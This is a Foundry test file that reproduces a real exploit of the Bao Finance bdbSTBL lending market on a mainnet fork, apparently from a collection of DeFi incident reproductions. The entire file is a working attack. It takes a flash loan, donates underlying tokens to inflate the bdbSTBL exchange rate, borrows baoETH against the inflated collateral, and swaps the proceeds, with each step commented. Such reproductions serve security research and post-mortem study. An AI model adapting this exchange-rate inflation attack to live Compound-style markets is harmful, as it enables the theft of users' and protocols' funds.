// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~46K USD$
// Attacker : https://etherscan.io/address/0x00693a01221a5e93fb872637e3a9391ef5f48300
// Attack Contract : https://etherscan.io/address/0x3f99d5cd830203a3027eb0ed6548db7f81c3408f
// Vulnerable Contract : https://etherscan.io/address/0xb0f8fe96b4880adbdede0ddf446bd1e7ef122c4e
// Attack Tx : https://etherscan.io/tx/0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xb0f8fe96b4880adbdede0ddf446bd1e7ef122c4e#code

// @Analysis
// Twitter Guy : https://twitter.com/PeckShieldAlert/status/1676224397248454657

// @similar event
// https://blog.hundred.finance/15-04-23-hundred-finance-hack-post-mortem-d895b618cf33

interface IbSTBL is IERC20 {
    function joinPool(uint256) external;
    function exitPool(uint256) external;
}

interface IbdbSTBL is IERC20 {
    function mint(uint256, bool) external;
    function redeem(uint256 redeemTokens) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 aDAI = IERC20(0x028171bCA77440897B824Ca71D1c56caC55b68A3);
    IERC20 aUSDC = IERC20(0xBcca60bB61934080951369a648Fb03DF4F96263C);
    IERC20 FiatToken = IERC20(0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF);
    IERC20 AToken1 = IERC20(0x1C050bCa8BAbe53Ef769d0d2e411f556e1a27E7B);
    IERC20 AToken2 = IERC20(0x7b2a3CF972C3193F26CdeC6217D27379b6417bD0);
    IERC20 Facet = IERC20(0xa6969A3f8B4E32204DBC1D83C21443D303b840e5);
    IbSTBL bSTBL = IbSTBL(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8);
    IERC20 baoETH = IERC20(0xf4edfad26EE0D23B69CA93112eccE52704E0006f);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IbdbSTBL bdbSTBL = IbdbSTBL(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e);
    ICErc20Delegate bdbaoETH = ICErc20Delegate(0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_620_870);
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(aDAI), "aDAI");
        vm.label(address(aUSDC), "aUSDC");
        vm.label(address(AToken1), "AToken1");
        vm.label(address(AToken2), "AToken2");
        vm.label(address(bSTBL), "bSTBL");
        vm.label(address(baoETH), "baoETH");
        vm.label(address(bdbSTBL), "bdbSTBL");
        vm.label(address(bdbaoETH), "bdbaoETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(Router), "Router");
        vm.label(address(AaveV2), "AaveV2");
    }

    function testExploit() external {
        // FiatToken.approve(address(USDC), type(uint256).max);
        // AToken1.approve(address(aUSDC), type(uint256).max);
        // AToken2.approve(address(aDAI), type(uint256).max);
        // Facet.approve(address(bSTBL), type(uint256).max);
        USDC.approve(address(AaveV2), type(uint256).max);
        DAI.approve(address(AaveV2), type(uint256).max);
        aUSDC.approve(address(bSTBL), type(uint256).max);
        aDAI.approve(address(bSTBL), type(uint256).max);
        bSTBL.approve(address(bdbSTBL), type(uint256).max);
        baoETH.approve(address(Balancer), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(USDC);
        assets[1] = address(DAI);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 17_550_000 * 1e6;
        amounts[1] = 17_510_000 * 1e18;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        AaveV2.deposit(address(USDC), amounts[0], address(this), 0);
        AaveV2.deposit(address(DAI), amounts[1], address(this), 0);
        bSTBL.joinPool(34_819_000 * 1e18 + 1); // mint bdbSTBL underlyingtoken with USDC and DAI

        bdbSTBL.mint(1, true); // mint 5 bdbSTBL
        bdbSTBL.redeem(3); // redeem 3 bdbSTBL, remain 2 bdbSTBL

        bSTBL.transfer(address(bdbSTBL), 34_819_000 * 1e18); // donate underlyingtoken to inflate bdbSTBL exchangeRate
        bdbaoETH.borrow(41.3 ether);
        bdbSTBL.redeemUnderlying(34_819_000 * 1e18); //redeem almost all underlyingtoken

        bSTBL.exitPool(34_819_000 * 1e18); // burn underlyingtoken to get USDC and DAI

        AaveV2.withdraw(address(USDC), amounts[0] - 1, address(this));
        AaveV2.withdraw(address(DAI), amounts[1] - 1, address(this));

        swapbaoETHToUSDCAndDAI();
        return true;
    }

    function swapbaoETHToUSDCAndDAI() internal {
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: 0x1a44e35d5451e0b78621a1b3e7a53dfaa306b1d000000000000000000000051b,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: address(baoETH),
            assetOut: address(WETH),
            amount: baoETH.balanceOf(address(this)),
            userData: new bytes(0)
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        Balancer.swap(singleSwap, funds, 39 ether, block.timestamp);

        Uni_Router_V3.ExactOutputSingleParams memory _Param1 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 15_795 * 1e6 + 10,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Param1);
        Uni_Router_V3.ExactOutputSingleParams memory _Param2 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(DAI),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 15_759 * 1e18 + 10,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Param2);
    }
}
